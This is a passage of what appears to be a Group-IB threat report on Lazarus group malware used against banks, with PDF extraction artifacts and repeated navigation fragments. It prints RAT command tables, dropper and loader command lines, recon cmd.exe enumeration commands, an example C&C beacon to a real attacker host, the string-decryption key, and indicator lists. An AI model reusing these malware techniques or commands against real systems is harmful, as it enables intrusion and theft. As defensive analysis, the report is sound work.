\u02dale\ndropper.exe \u0152a \n[service name] \n[path to DLL]\nInstalls the library as a \nservice\nArguments\nDescription\ndropper.exe -x \n\n[key] -l\nEnumerates system services\ndropper.exe \n\n-x [key] -e \n\n[servicename] \n\n[con\u02dag]\nExtracts and decrypts the payload \n\nfrom con\u02dag and sets it as a service\ndropper.exe -x \n\n[key] -f\nInstalls implants by adding \n\ninformation about them to the \n\nsystem registry\ndropper.exe \n-x [key] -o \n[eventname]\nCalls OpenEventA with a special \nevent name\ndropper.exe \n-x [key] -t \nCalls OpenEventA with a special \n\nevent name, then calls Setvent API\nCommands of the \u02dcrst version:\nVersion 1\nVersion 2\nIn addition, Dropper can read executable data from registry keys and embed \nthem in the selected process. The executable data is read from the following \n\nregistry keys:\n\u0141\n \nHKLM\\SYSTEM\\CurrentControlSet\\Services\\<name of service>\\Security\\Data2\n\u0141\n \nHKLM\\SYSTEM\\CurrentControlSet\\Services\\<name of service>\\Security\\Data3\nCommands of the second version\nRECON\n\u02dc\u02da\u02dc\u02db\u02dd\u02d9\u02c6\u02c7\u02dd \n\n\u02d8\u02dd\u02dc\u02dc\u02c7\nDROPPER\nCLIENT_RAT\nCLIENT_RAT\nCLIENT_RAT\nCLIENT_RAT\nLOADER\nDROPPER\nLOADER\nLOADER\nDropper decrypts \nand embeds Loader\nextracts decrypted \nClient_RAT\nLoader decrypts \n\nand embeds \n\nClient_RAT\nRecon decrypts \nand embeds \nDropper\n2\n3\n1\n\n\n\n\n\n\n\n\n4 \n \nRecommendations\n1 \n  \nKey \n \nFindings \n2 \n  \nAttack \n \npreparation and \nimplementation\n3 \n  \nAttack \n \norganizers\n5 \n \nIndicators of \n\ncompromise\n6 Appendix\n \n 14\nLoader is used to decrypt the payload \u0160 Client_RAT or Client_Tra\u02dccForwarder \n\u0160 and inject it into the legitimate process (for example, in lsass.exe)\nHackers manually specify the C&C server at the time when the main program \nis started. That\u2122s why even if researchers detect the loader they cannot \nidentify where the C&C server is located, by whom it is controlled, and which \n\nport is used for connection. In some cases, an additional loader was used by \n\ncriminals.  \nExample of loader launch:  \n \nClient_Tra\u02dccForwarder\nThis module was installed on one of the PCs in the internal network of the \nattacked organization. It proxies tra\u02dbc from C&C server to PCs in the local \nnetwork of the attacked organization.\nClient_RAT\nThe Client_RAT program provides full control over the target system: it allows \nyou to analyze the system, download and execute \u02dales, transfer data from the \n\ninfected computer to the C&C server.\nCommunications with the C&C server are performed over an encrypted SSL \nchannel. For this purpose, Client_RAT uses statically linked libcurl libraries, \nversion 7.47.1 (FEB 2016).\nloader.exe -d \u00abencrypted_payload.bin\u00bb -p 1540 -s [encrypted_C&C:port] -r [encrypted_commands]\nArgument -d:\n\n \n\n \n\n\n\n\n\n\n\n\n\n\n 15\nThis program may execute the following commands received from the C&C \nserver:\nCommand\nDescription\nNONE\nDo not execute any commands\nGINF\nCollect and send extensive \n\nsystem information about the \n\nPC\nSLEP\nDo not execute any commands\nHIBN\nDo not execute any commands\nDRIV\nGet information about available \n\ndisks in the system\nDIRP\nList \u02dales with the speci\u02daed \n\nextension\nCHDR\nChange current directory\nRUNX\nGet the user token\nMOVE\nRename speci\u02daed \u02dale\nFTIM\nSet the timestamps of the \u02dale \n\n%windir%/system32/kernel32.dll \n\nto the speci\u02daed \u02dale\nNEWF\nCreate a new directory with the \n\nspeci\u02daed name\nZDWN\nPresumably download the \u02dale/\n\u02dales\nPEIN\nInject code in the speci\u02daed \nprocess\nTCON\nPresumably connect to the \n\nspeci\u02daed network node\nDIR\nList \u02dales in the selected \n\ndirectory\nDIE\nRemove itself \n \nfrom the system\nDEL\nDelete selected \u02dale\nWIPE\nDelete the selected \u02dale and \n\nmake it unrecoverable\nUPLD\nUpload the \u02dale to C&C\nSCFG\nGet a new bot con\u02daguration\nDRIV\nEnumerate installed drivers\nDOWN\nDownload and run the \u02dale\nCMDL\nRun the command and upload \n\nthe result of its work to \u02db&C\nGCFG\nDownload bot con\u02daguration\nRUN\nExecute command\nPVEW\nList running processes\nPEEX\nInject the code in the process \n\nexplorer.exe\nPKIL\nTerminate the process with the \n\nselected PID\nDescription\nCommand\n4 \n \nRecommendations\n1 \n  \nKey \n \nFindings \n2 \n  \nAttack \n \npreparation and \nimplementation\n3 \n  \nAttack \n \norganizers\n5 \n \nIndicators of \n\ncompromise\n6 Appendix\n \n 16\nDue to analysis of Lazarus infrastructure, Group-IB specialists have detected \nthat the attack was controlled from two IP addresses:\n\u0141\n \n210.52.109.22 belongs to an autonomous system China Netcom. However, some \n\nsources indicate that the set of IPs 210.52.109.0/24 is assigned to North Korea.\n\u0141\n \n175.45.178.222 refers to a North Korean Internet service provider. \nThe Whois \n\nservice indicates that this address is allocated to the Potonggang District, \n\nperhaps coincidentally, where Natinal Defence Commission is located \u0160 the \nhighest military body in North Korea\nThrough investigation of public information, we came across a TV report \nfrom a South Korean news agency Arirang News dated 2016 \nOn the screen behind the host, Group-IB specialists noticed two IP addresses \n175.45.178.19 and 175.45.178.97, which had been used to control Ghost RAT \nmalware. Both IP addresses are in the same set of IP addresses as an IP address \n\n175.45.178.222 that was discovered by Group-IB specialists.\nThe South Korea\u2122s National Police Agency reportedly identi\u02daed that the cyber-\nattack had been performed from the un\u02danished North Korean Ryugyong hotel. \n\nGroup-IB could not con\u02darm this location attribution. \nATTACK \n\nORGANIZERS\n3.1 \n \nInvolvement \n \nof North Korea \n03\n4 \n \nRecommendations\n1 \n  \nKey \n \nFindings \n2 \n  \nAttack \n \npreparation and \nimplementation\n3 \n  \nAttack \n \norganizers\n5 \n \nIndicators of \n\ncompromise\n6 Appendix\n \n 17\n1st Bureau Operations\n2nd Bureau Reconnaissance\n\n3rd Bureau Foreign Intelligence\n\n5th Bureau Inter-Korea Dialogue\n\n6th Bureau Technical\n\n7th Bureau Rear Services\n\nBureau 121\nReconnaissance \nGeneral Bureau\nStarting in 2016, the Lazarus group tried to mask their activity by \n\npretending to be Russian hackers:\n \n1.\n \nThe Client_Tra\u02dbcForwarder module includes debugging symbols and \n\nstrings containing Russian words in descriptions of commands received by \n\nmalware from the C&C server.\n \n\n \n\nIt\u2122s worth noting that \"Russian commands\" received from the server are \n\nnot typical for a Russian native speaker, and in the case of the \u00abpoluchit\u00bb \n\n(to receive) command the meaning of the word contradicts the action (to \n\nsend) it is intended for.\n \n\n \n\n \n\n \n \n\n \n2.\n \nTo protect their executables, hackers used Enigma Protector, a commercial \n\nproduct, which was created by a Russian software developer.\n3.\n \nExploits for Flash and SilverLight were borrowed from the sets of exploits \n\ncreated by Russian-speaking hackers. \nThese techniques to mask attribution initially mislead some researchers \n\nconducting preliminary analysis.\n3.2 \n \nMasquerading \n \nas Russian hackers\nPoluchit (means \"to get\" in Russian)\n               \n \nSend a network address of the current \nLayer 2 server to the C&C server\n \nThe DarkSeoul group (aka Lazarus) is controlled by Bureau 121, a division of the \nReconnaissance General Bureau, a North Korean intelligence agency. Bureau 121 \n\nis responsible for conducting military cyber campaigns.\n 18\nRECOMMENDATIONS\n04\nUpdates of software and operating systems\nTo prevent infection through execution of exploits, it is enough to update \nyour Microsoft and Adobe software.The Lazarus group uses known and \n\npatched exploits, rather than leveraging 0day vulnerabilities. That\u2122s why, \n\neven usual software updates did not allow attackers to in\u02daltrate corporate \n\nnetworks. Unfortunately, some of the attacked banks did not comply with this \n\nrequirement.\nNetwork tra\u02dcc analysis\nEven if the criminals have managed to obtain access to the corporate \nnetwork, the attack can still be successfully prevented. After intrusion into the \ncompany\u2122s network hackers still need to \u02dand systems of their interest, and \ngain access to them. It takes days and even months sometimes, and this time \n\nshould be used to detect the malicious activity.\nAttackers use malicious programs that transfer data to the C&C server \u0160 \nLayer 1. Communications between the infected computer and the C&C server \ncan be identi\u02daed through network tra\u02dbc analysis. All communications are \n\nencrypted, that is why you should use solutions that can detect network \n\nanomalies based on threat intelligence data.\nApplication whitelisting\nApplication whitelisting should be introduced into critical bank servers. This \nwill prevent attackers from installing their remote control tools, monitoring \n\n\u02danancial transactions, and escalating privileges. It also helps to identify \n\nunauthorized attempts to run such malicious applications.\nChecking indicators of compromise\nThe \ufb01Indicators of compromise\ufb02 section contains current and historical \nintelligence data. With these indicators, you can check if your organization \nwas, or is, under attack by Lazarus. The group uses legitimate compromised \nservers, that\u2122s why these indicators can give false positives.\nResponse\nAnd the most important thing: if you have detected trails of a targeted attack \nat any stage, you need to involve specialized companies for its analysis. \n\nIncorrect responses to the attack result in the attacker activity remaining \n\npartly undetected to enable criminals to achieve their goal \u0160 to steal money.\n4 \n \nRecommendations\n1 \n  \nKey \n \nFindings \n2 \n  \nAttack \n \npreparation and \nimplementation\n3 \n  \nAttack \n \norganizers\n5 \n \nIndicators of \n\ncompromise\n6 Appendix\n \n 19\nABOUT \n \nGROUP-IB\nGroup-IB is one of the global leaders in preventing and investigating high-\n\ntech crimes and online fraud. Since 2003, the company has been active in the \n\n\u02daeld of computer forensics and information security, protecting the largest \n\ninternational companies against \u02danancial losses and reputational risks.\n \nInternational honors\nThe company is recognized by Gartner as a threat intelligence vendor with \nstrong cyber security focus and the ability to provide leading insight to the \n\nEastern European region and recommended by the Organization for Security \n\nand Co-operation in Europe (OSCE). In 2017 IDC Report named Group-IB the \n\nleader of the Russian Threat Intelligence Services Market. The company is a \n\nmember of the World Economic Forum working group on cybersecurity.\n \nClients worldwide\nFortune 500 companies worldwide use Group-IB products and services. \nGroup-IB clients include top-tier banks and \u02danancial institutions, FMCG brands \n\nand industrial corporations, oil and gas companies, software and hardware \n\nvendors, telecommunications service providers the US, Western Europe, the \n\nMiddle East, Asia and Australia.\n \nCyberCrimeCon2017\nAnnual conference organized by Group-IB aims to empower global threat \nintelligence exchange in one of the hottest spot on cybersecurity map. Be the \n\n\u02darst to discover key cybercrime trends and get a chance to interact with the \n\nglobal experts directly, both on and off stage. \n \n\nLearn more on 2017.group-ib.com\n 20\nThreat\n \nIntelligence\nLearn about threats, leakages, \nattacks, and hacking activity \n\nbefore they can harm your \n\nbusiness\nTDS Sensor \n \n+ TDS Polygon\nDetect malicious incidents in \nyour internal network to prevent \n\nattacks, intrusions, data leaks, and \n\nespionage\nIncident \n \nResponse\nCERT-GIB \u0160 24/7 emergency \nresponse and effective incident \n\nmanagement\nSecure \n \nBank\nProtect online payments by \nidentifying fraud preparation and \n\nattempted execution on client \n\ndevices\nBrand \n \nProtection\nPrevent online brand abuse, \nmanage reputational risks and \n\nreduce online counterfeit sales\nComputer Forensics \n \nand Investigation\nThe largest computer forensics \nlaboratory in Eastern Europe with \n\n150+ successful investigations \n\nworldwide\nGroup-IB products and services\nLearn more on \ngroup-ib.com\n 21\n5.1 IP addresses of attackers\n5.2 \n \nIP addresses with \n \nSoftEther VPN\nINDICATORS \n \n\nOF COMPROMISE\nIP\nCountry\nComment\n175.45.178.222\nNorth Korea\nPotonggang District, where Natinal Defence Commission \n\nof North Korea is located\n210.52.109.22\nNorth Korea\nLocated in the network of China Netcom\n157.7.135.182\nJapan\nVPN server with an agent SoftEther VPN\n\nJapan Network Information Center installed\n202.101.36.45\nChina\nVPN server with an agent SoftEther VPN\n\nShanghai Telecom installed\nIP\nCountry\nCerti\u02dacate name \nComments\n157.7.135.182\nJapan\nvpn140818026.softether.net\nJapan Network \n\nInformation Center\n202.101.36.45\nChina\nvpn421337203.sedns.cn\nShanghai Telecom\n202.129.24.4\nThailand\nvpn334555897.softether.net\nCAT-Northeast Telecom\n78.89.183.37\nKuwait\nvpn401107085.softether.net\nWataniya Telecom\n31.3.225.57\nUSA\nvpn204475098.softether.net\nDedicated server hosting\n207.162.24.86\nCanada\nvpn311153980.softether.net\nUniversite du Quebec\n209.254.82.137\nUSA\nvpn835666623.softether.net\nPaeTec Communications, \n\nInc. TELECOM\n77.241.47.234\nRussia\nvpn656325103.softether.net\ntvoe.tv\n173.198.127.221\nUSA\nvpn154284736.softether.net\nWarner Bros. \n\nEntertainment Inc\n180.18.169.69\nJapan\nvpn839766209.softether.net\nJapan Network \n\nInformation Center\n31.197.217.5\nItaly\nvpn844692605.softether.net\nTelecom Italia S.p.a.\n140.123.92.101\nTaiwan\nvpn147623034.softether.net\nTaiwan Network \n\nInformation Center\n140.121.120.229\nTaiwan\nvpn178828146.softether.net\nTaiwan Network \n\nInformation Center\n05\n4 \n \nRecommendations\n1 \n  \nKey \n \nFindings \n2 \n  \nAttack \n \npreparation and \nimplementation\n3 \n  \nAttack \n \norganizers\n5 \n \nIndicators of \n\ncompromise\n6 Appendix\n \n 22\n5.3 IP addresses used to control the C&C infrastructure\nIP addresses of compromised \n \nhosts with Server_RAT\nListens on port 3365\nIP addresses of \n\ncompromised hosts \n\nwith PortForwarder\n\nRedirects to port 443\nIP addresses of compromised \n\nhosts with Backend_Listener\n\nListens on ports 8080 and \n\n9090\n140.121.120.229\n27.131.59.198\n\n194.78.90.21\n\n140.123.92.101\n\n31.210.105.105\n\n31.197.217.5\n\n182.77.60.35\n\n203.131.230.104\n\n80.60.105.128\n\n203.114.109.68\n\n165.123.67.111\n\n178.222.166.209\n\n140.114.122.178\n\n63.247.182.137\n\n140.121.100.63\n\n114.174.228.100\n\n202.183.185.90\n\n118.189.38.21\n\n203.66.57.237\n\n210.227.170.229\n\n180.18.169.69\n\n173.198.127.221\n\n86.120.134.50\n\n77.241.47.234\n\n182.73.40.130\n\n58.64.203.66\n\n81.93.72.18\n\n61.122.232.25\n\n209.254.82.137\n\n118.22.154.159\n\n207.162.24.86\n\n178.252.148.240\n\n212.14.44.245\n\n210.213.80.237\n\n180.234.11.19\n\n51.254.71.167\n\n41.41.241.194\n\n31.3.225.57\n\n69.91.178.16\n180.94.69.107\n\n218.29.194.101\n\n140.119.98.20\n\n64.116.135.73\n\n140.115.31.220\n\n78.89.183.37\n\n221.132.18.43\n\n190.252.8.138\n\n31.210.119.142\n\n61.90.156.121\n\n212.34.228.66\n\n196.214.247.58\n\n12.49.13.202\n\n41.72.101.138\n\n60.96.139.113\n\n80.78.73.204\n\n212.30.75.210\n\n87.252.182.182\n\n166.111.80.223\n\n140.116.31.195\n\n24.201.106.142\n\n41.33.212.94\n\n31.192.208.227\n\n193.19.174.60\n\n220.132.243.188\n\n69.196.83.206\n\n62.210.146.3\n\n208.124.153.14\n\n140.112.90.235\n\n47.176.2.12\n\n164.70.22.40\n\n211.240.78.135\n\n202.56.120.210\n\n184.163.74.15\n\n210.241.42.173\n\n218.248.46.26\n12.49.13.202\n\n31.210.105.105\n\n202.129.24.4\n\n210.213.90.173\n\n187.109.80.61\n\n212.219.35.51\n\n203.131.230.104\n\n2.32.113.178\n\n187.44.139.252\n\n123.200.9.178\n\n82.144.131.5\n\n202.183.185.91\n\n209.105.239.42\n\n209.81.121.51\n\n140.115.31.220\n\n80.78.73.204\n\n140.115.42.147\n\n212.14.44.245\n\n165.123.67.111\n\n66.207.112.187\n\n203.66.57.237\n\n140.116.178.123\n\n140.116.31.195\n\n140.112.14.16\n\n202.183.185.90\n\n41.72.101.138\n\n59.120.19.101\n\n125.214.195.17\n\n69.196.83.206\n\n175.45.61.44\n31.192.208.xxx\n 23\nCerti\u02dacate thumbprint\n\ufb01Issued for\ufb02 Field\nIssue date\nIP addresses where \nthe certi\u02dacate was \n\ndetected\nde8166daca44cca2ef26031f\nd8a489222d8fa74c\nwww.longmusic.com/\n\nemailAddress=master@\nlongmusic.com\n2017-02-09\n12.49.13.202\n31.210.105.105\nb82ce23ef56fd59df2d54cd\n\n6ab0d097ec38a72bb\nwww.comtech.com/\n\nemailAddress=master@\ncomtech.com\n2016-11-27\n187.44.139.252\n1f2ae52ccf5ace9a27f521043\n816f8ca02405779\nwww.fartit.com/\n\nemailAddress=master@\n\nfartit.com\n2016-11-08\n210.213.90.173\n\n187.109.80.61\n\n212.219.35.51\n6e55459ddbc666e5d6f898\n\n44f5d2a2647be426ca\nwww.wikaba.com/\n\nemailAddress=master@\n\nwikaba.com\n2016-11-07\n202.129.24.4\nd35da9d13883b3f0c575144\n\nb3cee58d5744a9e48\nwww.telecomm.com/\n\nemailAddress=consult@\n\nwww.telecom.com\n2016-11-07\n203.131.230.104\n6bab9ca99fcdd465a56463a\n\n65122f9e7ba367219\nwww.instanthq.com/\n\nemailAddress=master@\n\ninstanthq.com\n2016-11-01\n2.32.113.178\na8b0b4f42547aaf608f062c\n\n6f9aa1e3fb33caaf0\ntradeboard.mefound.com/\n\nemailAddress=master@\n\nmefound.com\n2016-10-21\n82.144.131.5\n\n202.183.185.91\nc84c214878ebbee35d853cb\n\n2f739f919238550a4\nwww.biolab.com/\n\nemailAddress=master@\n\nbiolab.com\n2016-10-03\n123.200.9.178\n935192f61d0a72cc24d01fea\n\nb5a18de9a3837b42\nwww.res\u02danan.com/\n\nemailAddress=info@\n\nres\u02danan.com\n2016-08-18\n209.105.239.42\n\n209.81.121.51\n\n182.77.60.35\n80.78.73.204\n140.115.31.220\n140.115.42.147\n26b4162e29de9c4a64b4dfd\n\n93b72c6426bc9dc8e\n\u02danews.otzo.com/\n\nemailAddress=master@\notzo.com\n2016-04-10\n41.72.101.138\n202.183.185.90\n140.112.14.16\n140.116.31.195\n140.116.178.123\n203.66.57.237\n66.207.112.187\n165.123.67.111\n212.14.44.245\n106.2.44.86\nf1f7c47c154a3f95cbc41a329\n9ce80a45e566519\nhost.global.com/\n\nemailAddress=info@host.\n\nglobal.com\n2016-03-21\n69.196.83.206\n\n175.45.61.44\n57cfdf9b1e3a3675e5a971e19\n\n05f1ca5afd228bf\nlatest.ignorelist.com/\n\nemailAddress=consult@\n\nlatest.ignorelist.com\n2016-03-03\n59.120.19.101\n\n125.214.195.17\n5.4 \n \nCerti\u02dacates used \n \n\nto redirect tra\u02dcc\n4 \n \nRecommendations\n1 \n  \nKey \n \nFindings \n2 \n  \nAttack \n \npreparation and \nimplementation\n3 \n  \nAttack \n \norganizers\n5 \n \nIndicators of \n\ncompromise\n6 Appendix\n \n 24\nHash\nMalware type\nFile names\n4cc10ab3f4ee6769e520694a10f611d5\nSilverlight exploit\ncambio.xap\n6dffcfa68433f886b2e88fd984b4995a\n1f2cd85583a4a56b764ba6429c2155ec\nFlash exploit\ncambio.swf\ncb52c013f7af0219d45953bae663c9a2\n9216b29114fb6713ef228370cbfe4045\nReconnaissance module\nsvchost.exe\n1bfbc0c9e0d9ceb5c3f4f6ced6bcfeae\nDropper\ngpsvc.exe\n85d316590edfb4212049c4490db08c4b\n1f7897b041a812f96f1925138ea38c46\n1507e7a741367745425e0530e23768e6\nDropper\nMBLCTR.EXE\ngpsvc.exe\n9914075cc687bdc352ee136ac6579707\nLoader\nfdsvc.exe\n9cc6854bc5e217104734043c89dc4ff8\nClient_Tra\u02dccForwarder\nfdsvc.dll\n25200d3fe30785f3c90a91faf8ebf1b5\n\n5994a8fd8c68dd1cc51ce7ca0d9c2749\n\n889e320cf66520485e1a0475107d7419\n\n40e698f961eb796728a57ddf81f52b9a\nClient_Tra\u02dccForwarder\n8e32fccd70cec634d13795bcb1da85ff\nClient_RAT\nsrservice.hlp\ne29fe3c181ac9ddbb242688b151f3310\nClient_RAT\ndeskadp.dll \n\nsrservice.dll\n9216b29114fb6713ef228370cbfe4045\nClient_RAT\nsrservice.chm\n570e6ea21cdce694a4a74876ca87534a\nServer_RAT\nejbss.dll\ne4fb05a8c2da92ec5b19bdb59814464a\nServer_RAT\nmbcrs.rll\nf38f6d976e6d66abc86f9992e808670a\nServer_RAT\nsmtp.dat\n3c3982d068bc7f2d1e4742c2009b0f46\nServer_Tra\u02dccForwarder\nmsvmgr.exe\nb603a16a950056df336fe3950c81601d\n\nd032aeb54cf1229e011c070ecd64c33e\nServer_Tra\u02dccForwarder\nmsdtc.exe\n5C1917F6753D03A08328132DB1E06571\nBACKEND_LISTENER\nmsdtc.exe\n5.5 \n \nMalware\n 25\nAPPENDIX\n06\nRecon module\nThe svchost.exe \u02dale (MD5 cb52c013f7af0219d45953bae663c9a2, size 128512 \nbytes) is a Backdoor. This program is installed and launched on the target \n\nmachine through successful execution of exploits.\nOnce launched, the program adds itself to the auto-start by copying its \u02dale to the \ndirectory \ufb01%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\\n\nPrograms\\Startup\ufb02, collects information about the infected machine and sends it \n\nto the C&C server.\nIn addition, it can download and run third-party programs. The following \ncommands are executed using a command interpreter:\n\u00abcmd.exe /c \\\u00bbhostname > %s\\\u00bb\u00bb, &TempFileName);\n\u00abcmd.exe /c \\\u00bbwhoami >> %s\\\u00bb\u00bb, &TempFileName);\n\n\u00abcmd.exe /c \\\u00bbver >> %s\\\u00bb\u00bb, &TempFileName);\n\u00abcmd.exe /c \\\u00bbipcon\u02dag -all >> %s\\\u00bb\u00bb, &TempFileName);\n\u00abcmd.exe /c \\\u00bbping www.google.com >> %s\\\u00bb\u00bb, &TempFileName);\n\n\u00abcmd.exe /c \\\u00bbquery user >> %s\\\u00bb\u00bb, &TempFileName);\n\n\u00abcmd.exe /c \\\u00bbnet user >> %s\\\u00bb\u00bb, &TempFileName);\n\n\u00abcmd.exe /c \\\u00bbnet view >> %s\\\u00bb\u00bb, &TempFileName);\n\n\u00abcmd.exe /c \\\u00bbnet view /domain >> %s\\\u00bb\u00bb, &TempFileName);\n4 \n \nRecommendations\n1 \n  \nKey \n \nFindings \n2 \n  \nAttack \n \npreparation and \nimplementation\n3 \n  \nAttack \n \norganizers\n5 \n \nIndicators of \n\ncompromise\n6 Appendix\n \n 26\nexe /c \\\u00bbreg query \\\u00bbHKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet \nSettings\\\u00bb >> %s\\\u00bb\u00bb,\n\u00abcmd.exe /c \\\u00bbtasklist /svc >> %s\\\u00bb\u00bb, &TempFileName);\n\u00abcmd.exe /c \\\u00bbnetstat -ano | \u02dand \\\u00bbTCP\\\u00bb >> %s\\\u00bb\u00bb, &TempFileName);\n}\nThe analyzed sample can download and run executable \u02dales on \ncommand from the C&C server (the \"http\" command). The \"killkill\" \n\ncommand, used for self-removal from the infected system, applies a \n\nhard-coded name of a .BAT \u02dale \"% temp% \\ tmp095j.bat\". \nAn example of a request to the C&C server is shown below:\nGET /design/dfbox/list.jsp?action=What&u=10729854751740 HTTP/1.1\nConnection: Keep-Alive\n\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 \nFirefox/47.0\nHost: www.eye-watch[.]in\nBelow is a code block with a command request sent to the C&C \nserver:\nCommand\nDescription\nkillkill\nRemove itself from the system\nhttp\nDownload and run the \u02dale from the C&C server\n 27\nBelow is a code block informing the C&C server about the results of \n\u02dcle loading and execution commands:\nBelow is a code block informing the C&C server about the results of \nself-removal commands:\n4 \n \nRecommendations\n1 \n  \nKey \n \nFindings \n2 \n  \nAttack \n \npreparation and \nimplementation\n3 \n  \nAttack \n \norganizers\n5 \n \nIndicators of \n\ncompromise\n6 Appendix\n \n 28\nBelow is a code block informing the C&C server about results of the \ndata system collection command: \nThis remote control tool is installed on command from Recon, in the \nevent the computer is of interest to the attacker. The application is \ndeployed as follows: Dropper -> Loader -> Payload.\nThe gpsvc.exe \u02dale (MD5: 1bfbc0c9e0d9ceb5c3f4f6ced6bcfeae, size: \n3449344 bytes) is an executable \u02dale and can be classi\u02daed as Dropper. \n\nThis \u02dale is downloaded on the target system using Recon.\n \nThis console utility can be launched with the following arguments:\nClient_RAT\nArguments\nDescription\ngpsvc.exe -l\nEnumerates system services\ngpsvc.exe  -e [path]\nExtracts and decrypts the payload and saves it to the \nspeci\u02daed path\ngpsvc.exe \u0152a [service name] \n\n[path to DLL]\nInstalls the library as a service \n 29\nThe deskadp.dll and srservice.dll \u02dales (MD5: e29fe3c181ac9ddbb2426\n88b151f3310, size: 79360 bytes) are executable dynamic libraries and \n\ncan be classi\u02daed as Loader. These \u02dales are downloaded on the target \n\nsystem using Recon and can ensure its persistence in the system using \n\nDropper.\nLoader is used to decrypt Payload. The encrypted \u02dale named \nsrservice.chm (MD5: 9216b29114fb6713ef228370cbfe4045) is a RAT, \n\nwhich is saved (in encrypted form) to the directory \ufb01%windir%\\Help\\X.\n\nchm\ufb02, where X is the name of the RAT \u02dale without an extension.\nAn additional \u02dale named srservice.hlp (MD5: 8e32fccd70cec634d1379\n5bcb1da85ff) is a RAT con\u02daguration \u02dale, which contains a C&C address \n\nembedded in an encrypted form.\nThe decrypted con\u02dcguration \u02dcle contains the following network \naddresses:\n\u0141\n \ntradeboard.mefound.com:443\n\u0141\n \nmovis-es.ignorelist.com:443\nIn addition to con\u02daguration data, the \u02dale contains a built-in encrypted \n\nnetwork address of the tradeboard.mefound.com:443 node.\nThe strings are encrypted with a simple XOR operation of every \nsubsequent 2 bytes with a constant 0x2CDF.\n4 \n \nRecommendations\n1 \n  \nKey \n \nFindings \n2 \n  \nAttack \n \npreparation and \nimplementation\n3 \n  \nAttack \n \norganizers\n5 \n \nIndicators of \n\ncompromise\n6 Appendix\n \n 30\nBelow is the buffer with the result of strings\u2122 decryption.\n 31\nThe application provides an option to specify the second network \nnode, however it was not speci\u02daed in the \u02dale identi\u02daed and analyzed by \n\nGroup-IB specialists.\nAfter its launch, srservice.dll scans the % windir%\\Help\\ directory for a \n\u02dale with the same name, but with the .chm extension, then decrypts and \n\ninjects it into the address space of the lsass.exe process.\nFollowing this, the infected computer is controlled through a pre-\ninstalled infrastructure with several layers of anonymization designed to \n\ncomplicate investigation.\nThe RAT contains usual commands in English. Communications with the \nC&C server are performed over an encrypted SSL channel as the Client_\n\nRAT is compiled with statically linked libcurl libraries, version 7.47.1 (FEB \n\n2016).\nThis program may execute the following commands received from the \nC&C server: \nCommand\nDescription\nNONE\nDo not execute any commands\nGINF\nCollects and sends extensive system information about the PC\nSLEP\nDo not execute any commands\nHIBN\nDo not execute any commands\nDRIV\nGet information about available disks in the system\nDIRP\nList \u02dales with the speci\u02daed extension\nCHDR\nChanges the current directory\nRUNX\nGet the user's token\nMOVE\nRenames the speci\u02daed \u02dale\nFTIM\nSet the timestamps of the %windir%/system32/kernel32.dll \u02dale to the \n\nspeci\u02daed \u02dale\nNEWF\nCreate a new directory with the speci\u02daed name\nZDWN\nPurportedly, downloads a \u02dale/\u02dales\nPEIN\nInject the code in the speci\u02daed process\nTCON\nPurportedly, it connects to the speci\u02daed network node\nDIR\nEnumerates \u02dales in the selected directory\nDIE\nRemove itself from the system\nDEL\nDelete the selected \u02dale\nWIPE\nDelete the selected \u02dale and make it unrecoverable\n4 \n \nRecommendations\n1 \n  \nKey \n \nFindings \n2 \n  \nAttack \n \npreparation and \nimplementation\n3 \n  \nAttack \n \norganizers\n5 \n \nIndicators of \n\ncompromise\n6 Appendix\n \n 32\nArguments\nDescription\ndropper.exe -x [key] -l\nEnumerates system services\ndropper.exe -x [key] -e \n[servicename] [con\u02dag]\nExtracts and decrypts the payload from con\u02dag and sets it as a service\ndropper.exe -x [key] -f\nInstalls implants by adding information about them to the system \n\nregistry\ndropper.exe -x [key] -o \n\n[eventname]\nCalls OpenEventA with a special event name\ndropper.exe -x [key] -t \n\n[eventname]\nCalls OpenEventA with a special event name, then calls Setvent API\nUPLD\nUpload the \u02dale to the C&C server\nSCFG\nGet a new bot con\u02daguration\nDRIV\nList the installed drivers\nDOWN\nDownload and run the \u02dale\nCMDL\nExecute the command and upload the result of its operation to the C&C \n\nserver\nGCFG\nDownload bot con\u02daguration\nRUN\nRun the command\nPVEW\nList running processes\nPEEX\nInject the code in the explorer.exe process.\nPKIL\nTerminate the process with the selected PID\nClient_Tra\u02dccForwarder\nThis program is designed to provide access to the local network and is also \n\ninstalled using the original Dropper. The installation scheme is as follows: \n\nDropper -> Loader -> Loader -> Payload.\nThe gpsvc.exe and MBLCTR.EXE \u02dales (size: 753664 bytes, MD5: 85d316590edf\nb4212049c4490db08c4b) are executable \u02dales and can be classi\u02daed as Loader. \n\nThis \u02dale is installed on the target system using Dropper, which is downloaded \n\nusing Recon or Client_RAT.  \nThis console can be launched with the following arguments:\n\u0141\n \nKey means an encryption key. A MD5 hash (hashing algorithm) of this key is used to \ndecrypt the con\u02daguration \u02dale.\n\u0141\n \nCon\u02dag means a path to the con\u02daguration \u02dale that contains the name of the service, its \n\ndescription, and the loader of the main module, which will be installed on the system as \na service.\n 33\nThe program can also read executable data from the following registry keys \nand embed them into the selected process:\n \n\u0141\n \nHKLM\\SYSTEM\\CurrentControlSet\\Services\\<name of service>\\\n\nSecurity\\Data2\n\u0141\n \nHKLM\\SYSTEM\\CurrentControlSet\\Services\\<name of service>\\\n\nSecurity\\Data3\nfdsvc.exe (MD5 9914075cc687bdc352ee136ac6579707 and 60928 bytes) is an \n\nexecutable \u02dale and can be classi\u02daed as loader.\nExample of the Loader launch:\nloader.exe -d \"encrypted_payload.bin\" -p 1540 -s \n[encrypted_C&C:port] -r [encrypted_commands]\nLoader is used to decrypt payload. The \u02dale named fdsvc.dll (MD5: 9cc6\n\n854bc5e217104734043c89dc4ff8, size: 480768 bytes) is an encrypted \n\npayload which is Client_Tra\u02dbcForwarder.\nAfter decryption, it becomes a simple DLL (MD5 25200d3fe30785f3c9\n0a91faf8ebf1b5, size: 519392 bytes) and is used to create a tunnel from \n\nthe C&C server to the speci\u02daed network resource. The payload provides \n\na secure connection over a specially created protocol via a proxy server \n\n(an infected current host).\nDescription\n\nThe payload was compiled statically with the libcurl library, version \n7.49.1 (May 30, 2016), LibTomMath, and the libgcrypt library to support \n\nencrypted TLS tra\u02dbc.\n \nArguments\nDescription\n-d\nName of the \u02dale for decryption\n-p\nID of the process in which the payload should be embedded\n-r\nEncrypted param1\n-s\nEncrypted param2\n4 \n \nRecommendations\n1 \n  \nKey \n \nFindings \n2 \n  \nAttack \n \npreparation and 